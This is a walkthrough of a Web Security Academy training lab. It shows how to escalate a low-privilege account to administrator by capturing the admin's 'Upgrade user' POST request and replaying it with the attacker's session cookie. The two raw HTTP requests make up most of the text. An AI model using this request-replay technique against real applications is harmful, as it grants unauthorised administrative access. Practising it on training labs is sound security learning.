## Multi-step process with no access control on one step

This lab has an admin panel with a flawed multi-step process for changing a user's role. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin.

To solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator.

## Notes

- /admin
- /login

## Resume

1. Login with administrator:admin
2. Capture the 2nd request from **Upgrade user**
3. Log off and login with wiener:peter
4. Resend request on **Upgrade user** with wiener cookies


## Solve 

First, log in with administrator:admin to see what the admin portal look like and capture a **POST** request on **Upgrade user** aftre we get the request, downgrade the account : 

```
POST /admin-roles HTTP/2
Host: 0ae30009039362d580b7e0d200f20007.web-security-academy.net
Cookie: session=hMnaOOAFyxVSEtA1jzWSTbXUQpFv7bdr
Content-Length: 45
Cache-Control: max-age=0
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Origin: https://0ae30009039362d580b7e0d200f20007.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ae30009039362d580b7e0d200f20007.web-security-academy.net/admin-roles
Accept-Encoding: gzip, deflate, br
Priority: u=0, i



action=upgrade&confirmed=true&username=carlos
```

Log off then access to wiener account and update the previous request with the session cookies : 

```
POST /admin-roles HTTP/2
Host: 0ae30009039362d580b7e0d200f20007.web-security-academy.net
Cookie: session=PEzNfjqvd8cQdS4XatpqC3CcNHbqiIy0
Content-Length: 45
Cache-Control: max-age=0
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Origin: https://0ae30009039362d580b7e0d200f20007.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ae30009039362d580b7e0d200f20007.web-security-academy.net/admin-roles
Accept-Encoding: gzip, deflate, br
Priority: u=0, i



action=upgrade&confirmed=true&username=wiener
```

